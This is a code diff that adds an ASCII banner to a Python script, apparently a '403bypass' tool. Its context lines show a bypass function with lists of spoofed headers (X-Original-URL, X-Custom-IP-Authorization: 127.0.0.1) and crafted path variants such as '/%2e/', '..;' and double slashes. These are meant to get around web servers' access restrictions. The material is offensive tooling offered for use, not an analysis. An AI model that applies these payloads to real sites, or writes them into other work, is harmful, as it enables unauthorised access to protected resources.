@@ -4,6 +4,18 @@
 
 import requests,sys
 
+banner = '''
+  _  _    ___ _____ _                               
+ | || |  / _ \___ /| |__  _   _ _ __   __ _ ___ ___ 
+ | || |_| | | ||_ \| '_ \| | | | '_ \ / _` / __/ __|
+ |__   _| |_| |__) | |_) | |_| | |_) | (_| \__ \__ 
+    |_|  \___/____/|_.__/ \__, | .__/ \__,_|___/___/
+                          |___/|_|                  
+                          c0de by 99
+'''
+
+print(banner)
+
 def bypass(url,path):
     headerspayloads = [{'X-Original-URL': "/"+path},{'X-Custom-IP-Authorization': '127.0.0.1'},{'Referer': "/"+path}]
     payloads = [url + '/' +path,url + '/%2e/' + path,url + '/' + path + '/.',url + '//' + path + '//',url + '/./' + path + '/./',url + '/' + path + '.json',url + '/' + path + '?',url + '/' + path + '..;',url + '/' + path + '??']
